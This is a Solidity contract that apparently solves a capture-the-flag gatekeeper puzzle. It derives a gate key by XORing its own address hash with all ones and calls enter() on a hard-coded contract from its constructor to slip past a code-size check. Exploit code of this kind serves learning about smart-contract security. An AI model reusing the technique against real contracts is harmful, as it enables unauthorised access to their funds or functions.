// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface Gatekeeper {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Solve {
    constructor() {
        uint64 gateKey = uint64(
            bytes8(keccak256(abi.encodePacked(address(this))))
        );
        gateKey ^= 0xffffffffffffffff;

        (bool success, ) = payable(0x02b47139a02b56B6f0BAc431533e8F0327A8B3dE)
            .call(abi.encodeWithSignature("enter(bytes8)", bytes8(gateKey)));

        require(success, "Constructor failed");
    }
}
